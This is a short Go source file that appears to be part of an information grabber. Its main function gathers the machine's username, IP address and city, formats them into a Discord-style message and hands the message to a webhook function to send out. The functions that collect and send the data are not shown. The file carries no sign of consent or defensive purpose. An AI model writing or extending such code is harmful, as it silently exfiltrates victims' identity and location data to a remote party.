package main

import (
	"encoding/json"
	"strings"
)

func main() {
	data := makeWebhookString()
	webhook(data)
}

func makeWebhookString() string {
	var buffer strings.Builder
	var info IpInfo = NewIpInfo()
	var pcUsername = getPcUsername()
	var dashCount = len(pcUsername) + 2
	buffer.WriteString(strings.Repeat("-", dashCount))
	buffer.WriteString("\n")
	buffer.WriteString("**")
	buffer.WriteString(pcUsername)
	buffer.WriteString("**\n")
	buffer.WriteString(strings.Repeat("-", dashCount))
	buffer.WriteString("\n")
	buffer.WriteString("Location: ")
	buffer.WriteString(info.City)
	buffer.WriteString("\n")
	buffer.WriteString("ip: ")
	buffer.WriteString(info.Ip)
	buffer.WriteString("\n")
	buffer.WriteString("\n")
	return buffer.String()
}

func dojson(str string) {
	var result map[string]string
	err := json.Unmarshal([]byte(str), &result)
	DoErr(&err)

	for key, value := range result {
		println(strings.TrimSpace(key), ": ", value)
	}
}

func DoErr(err *error) {
	if *err != nil {
		print((*err).Error())
	}
}
